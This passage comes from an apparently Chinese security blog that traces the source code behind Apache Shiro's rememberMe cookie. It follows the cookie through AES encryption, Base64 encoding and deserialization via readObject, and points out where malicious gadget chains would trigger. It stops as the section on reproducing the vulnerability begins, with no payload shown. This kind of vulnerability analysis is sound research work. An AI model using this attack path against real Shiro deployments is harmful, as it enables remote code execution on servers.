加密模式</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MODE</span> <span class="operator">=</span> javax.crypto.Cipher.ENCRYPT_MODE;</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] output;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prependIv &amp;&amp; iv != <span class="literal">null</span> &amp;&amp; iv.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 加密操作</span></span><br><span class="line">        <span class="type">byte</span>[] encrypted = crypt(plaintext, key, iv, MODE);</span><br><span class="line"></span><br><span class="line">        output = <span class="keyword">new</span> <span class="title class_">byte</span>[iv.length + encrypted.length];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//now copy the iv bytes + encrypted bytes into one output array:</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// iv bytes:</span></span><br><span class="line">        System.arraycopy(iv, <span class="number">0</span>, output, <span class="number">0</span>, iv.length);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// + encrypted bytes:</span></span><br><span class="line">        System.arraycopy(encrypted, <span class="number">0</span>, output, iv.length, encrypted.length);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        output = crypt(plaintext, key, iv, MODE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">        log.trace(<span class="string">&quot;Incoming plaintext of size &quot;</span> + (plaintext != <span class="literal">null</span> ? plaintext.length : <span class="number">0</span>) + <span class="string">&quot;.  Ciphertext &quot;</span> +</span><br><span class="line">                <span class="string">&quot;byte array is size &quot;</span> + (output != <span class="literal">null</span> ? output.length : <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将加密结果转换为 ByteSource 对象并返回</span></span><br><span class="line">    <span class="keyword">return</span> ByteSource.Util.bytes(output);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续进入crypt函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] crypt(<span class="type">byte</span>[] bytes, <span class="type">byte</span>[] key, <span class="type">byte</span>[] iv, <span class="type">int</span> mode) <span class="keyword">throws</span> IllegalArgumentException, CryptoException &#123;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span> || key.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;key argument cannot be null or empty.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    javax.crypto.<span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> initNewCipher(mode, key, iv, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">return</span> crypt(cipher, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里其实就是AES内部的加密细节了<br>encrypt函数执行到最后结果如下：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829220941.png"><br>得到加密后的结果，回到rememberIdentity函数<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829224210.png"><br>进入rememberSerializedIdentity函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">rememberSerializedIdentity</span><span class="params">(Subject subject, <span class="type">byte</span>[] serialized)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!WebUtils.isHttp(subject)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;request and response in order to set the rememberMe cookie. Returning immediately and &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">            log.debug(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(subject);</span><br><span class="line">    <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(subject);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//base 64 encode it and store as a cookie:</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> Base64.encodeToString(serialized);</span><br><span class="line"></span><br><span class="line">    <span class="type">Cookie</span> <span class="variable">template</span> <span class="operator">=</span> getCookie(); <span class="comment">//the class attribute is really a template for the outgoing cookies</span></span><br><span class="line">    <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleCookie</span>(template);</span><br><span class="line">    cookie.setValue(base64);</span><br><span class="line">    cookie.saveTo(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829224409.png"><br>设置cooike成功<br><strong>总结</strong>：身份信息进行序列化——&gt;AES加密——&gt;Base64加密——&gt;cookie中的remeberMe</p>
+<h3 id="remeberMe的解析过程"><a href="#remeberMe的解析过程" class="headerlink" title="remeberMe的解析过程"></a>remeberMe的解析过程</h3><p>函数调用栈：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">decrypt:<span class="number">386</span>, JcaCipherService (org.apache.shiro.crypto)</span><br><span class="line">decrypt:<span class="number">382</span>, JcaCipherService (org.apache.shiro.crypto)</span><br><span class="line">decrypt:<span class="number">489</span>, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">convertBytesToPrincipals:<span class="number">429</span>, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">getRememberedPrincipals:<span class="number">396</span>, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">getRememberedIdentity:<span class="number">604</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">resolvePrincipals:<span class="number">492</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">createSubject:<span class="number">342</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">buildSubject:<span class="number">846</span>, Subject$Builder (org.apache.shiro.subject)</span><br><span class="line">buildWebSubject:<span class="number">148</span>, WebSubject$Builder (org.apache.shiro.web.subject)</span><br><span class="line">createSubject:<span class="number">292</span>, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilterInternal:<span class="number">359</span>, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilter:<span class="number">125</span>, OncePerRequestFilter (org.apache.shiro.web.servlet)</span><br><span class="line">internalDoFilter:<span class="number">178</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">153</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">167</span>, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">90</span>, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">492</span>, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:<span class="number">130</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">93</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">673</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">74</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">343</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">389</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">63</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">926</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1791</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">832</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>
+
+<p>使用前面生成的remeberMe的cookie值进行请求</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET -H <span class="string">&quot;cookie:rememberMe=jCmif8/p5A+C+p5PwHTlOWNsUCikdqRc5mLEb1PsaBvuroIawHP/03Zenr4iVKL3RsWjWCt3YkFsVXQKf4pkQLwPRUa4M9gzUuEmUZfR8U2YsXXETs8oYxatlg7IovW9/eM/jyqjWZ5sYQT7me+DY2lDSUasvbZofwaApRLrDw0xxM79I6XNpz0nlCkuAdWsZvS8ghAZyByl/UAWITIxbeNF6vWnwjsTcHtskaZ0QBwh4BGreNrVAh0dbl5Ah8U3BEID3yndJ9y7lbIT/QQTvfFgim6Rjh3TQaFIC6Dt+rxO782rJ4dkswpf3UOih35I47Vm/LcJzrvnxNlMQyPa8ttHMZEVsfh8mSKAeePyzkkM5j6yeY764AAH160CD1e8DXJlz6gyo+1bCJqmvDgPPfoIRPCVPsNlDUipANkGqYZvk9A8diXf3EiOuuvebbFuPsmYPsFWdiVnoV6Q9z+iHfO19mojLNsDHdeyQEHYE5FvsPrqPGnsaJc9NUBqNpOb; Phpstorm-10d910bb=a6bc0397-210c-4145-96b8-e9aedf363376&quot;</span> http://localhost:8090/samples_web_war/</span><br></pre></td></tr></table></figure>
+
+<p>在AbstractRememberMeManager类的getRememberedPrincipals方法中下断点</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> PrincipalCollection <span class="title function_">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取被记住的主体身份的序列化字节数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);</span><br><span class="line">        <span class="comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span></span><br><span class="line">        <span class="keyword">if</span> (bytes != <span class="literal">null</span> &amp;&amp; bytes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 将序列化字节数组转换为主体身份集合</span></span><br><span class="line">            principals = convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException re) &#123;</span><br><span class="line">        principals = onRememberedPrincipalFailure(re, subjectContext);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> principals;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入getRememberedSerializedIdentity函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;immediately and ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">            log.debug(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">WebSubjectContext</span> <span class="variable">wsc</span> <span class="operator">=</span> (WebSubjectContext) subjectContext;</span><br><span class="line">    <span class="keyword">if</span> (isIdentityRemoved(wsc)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取Servlet请求对象</span></span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(wsc);</span><br><span class="line">    <span class="comment">// 获取Servlet响应对象</span></span><br><span class="line">    <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(wsc);</span><br><span class="line">    <span class="comment">// 从请求中读取 cookie 的值</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> getCookie().readValue(request, response);</span><br><span class="line">    <span class="comment">// Browsers do not always remove cookies immediately (SHIRO-183)</span></span><br><span class="line">    <span class="comment">// ignore cookies that are scheduled for removal</span></span><br><span class="line">    <span class="keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (base64 != <span class="literal">null</span>) &#123;</span><br><span class="line">        base64 = ensurePadding(base64);</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将 Base64 编码的字符串解码为字节数组</span></span><br><span class="line">        <span class="type">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="literal">null</span> ? decoded.length : <span class="number">0</span>) + <span class="string">&quot; bytes.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> decoded;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//no cookie set - new site visitor?</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入convertBytesToPrincipals方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">convertBytesToPrincipals</span><span class="params">(<span class="type">byte</span>[] bytes, SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取加密服务对象</span></span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 解密</span></span><br><span class="line">        bytes = decrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 对解密后的结果进行反序列化</span></span><br><span class="line">    <span class="keyword">return</span> deserialize(bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230830160136.png"><br>进入decrypt函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] decrypt(<span class="type">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="type">byte</span>[] serialized = encrypted;</span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 调用解密方法进行解密</span></span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230830161101.png"><br>进入到JcaCipherService类的decrypt方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ByteSource <span class="title function_">decrypt</span><span class="params">(<span class="type">byte</span>[] ciphertext, <span class="type">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] encrypted = ciphertext;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//No IV, check if we need to read the IV from the stream:</span></span><br><span class="line">    <span class="type">byte</span>[] iv = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isGenerateInitializationVectors(<span class="literal">false</span>)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//We are generating IVs, so the ciphertext argument array is not actually 100% cipher text.  Instead, it</span></span><br><span class="line">            <span class="comment">//is:</span></span><br><span class="line">            <span class="comment">// - the first N bytes is the initialization vector, where N equals the value of the</span></span><br><span class="line">            <span class="comment">// &#x27;initializationVectorSize&#x27; attribute.</span></span><br><span class="line">            <span class="comment">// - the remaining bytes in the method argument (arg.length - N) is the real cipher text.</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//So we need to chunk the method argument into its constituent parts to find the IV and then use</span></span><br><span class="line">            <span class="comment">//the IV to decrypt the real ciphertext:</span></span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">ivSize</span> <span class="operator">=</span> getInitializationVectorSize();</span><br><span class="line">            <span class="type">int</span> <span class="variable">ivByteSize</span> <span class="operator">=</span> ivSize / BITS_PER_BYTE;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//now we know how large the iv is, so extract the iv bytes:</span></span><br><span class="line">            iv = <span class="keyword">new</span> <span class="title class_">byte</span>[ivByteSize];</span><br><span class="line">            System.arraycopy(ciphertext, <span class="number">0</span>, iv, <span class="number">0</span>, ivByteSize);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//remaining data is the actual encrypted ciphertext.  Isolate it:</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">encryptedSize</span> <span class="operator">=</span> ciphertext.length - ivByteSize;</span><br><span class="line">            encrypted = <span class="keyword">new</span> <span class="title class_">byte</span>[encryptedSize];</span><br><span class="line">            System.arraycopy(ciphertext, ivByteSize, encrypted, <span class="number">0</span>, encryptedSize);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to correctly extract the Initialization Vector or ciphertext.&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CryptoException</span>(msg, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decrypt(encrypted, key, iv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230830163004.png"><br>这里的函数的大概意思是将传入的ciphertext分成iv和encrypted两部分，在传入重载的decrypt中进行解密</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ByteSource <span class="title function_">decrypt</span><span class="params">(<span class="type">byte</span>[] ciphertext, <span class="type">byte</span>[] key, <span class="type">byte</span>[] iv)</span> <span class="keyword">throws</span> CryptoException &#123;</span><br><span class="line">    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">        log.trace(<span class="string">&quot;Attempting to decrypt incoming byte array of length &quot;</span> +</span><br><span class="line">                (ciphertext != <span class="literal">null</span> ? ciphertext.length : <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">byte</span>[] decrypted = crypt(ciphertext, key, iv, javax.crypto.Cipher.DECRYPT_MODE);</span><br><span class="line">    <span class="keyword">return</span> decrypted == <span class="literal">null</span> ? <span class="literal">null</span> : ByteSource.Util.bytes(decrypted);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里面就是进行AES解密的部分<br>回到convertBytesToPrincipals函数部分<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230830170202.png"><br>进入deserialize中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serializedIdentity)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getSerializer().deserialize(serializedIdentity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230830171114.png"><br>这里的getSerializer即获取序列化器，然后调用反序列化函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> SerializationException &#123;</span><br><span class="line">    <span class="keyword">if</span> (serialized == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;argument cannot be null.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">    <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(bais);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassResolvingObjectInputStream</span>(bis);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        <span class="comment">// 重点是这里   调用了readObject函数，也是触发各种恶意链的地方</span></span><br><span class="line">        <span class="type">T</span> <span class="variable">deserialized</span> <span class="operator">=</span> (T) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> deserialized;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to deserialze argument byte array.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializationException</span>(msg, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后返回至getRememberedPrincipals函数，得到了principal实例对象<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230830171558.png"><br>下面就是身份验证的步骤了<br><strong>总结</strong>：<br>获取remeberMe的值——&gt;base64解密——&gt;AES解密——&gt;反序列化</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="shiro-URLDNS"><a href="#shiro-URLDNS" class="headerlink" title="shiro+URLDNS"></a>shiro+URLDNS</h3><p>生成remeberMe的cookie值</p>
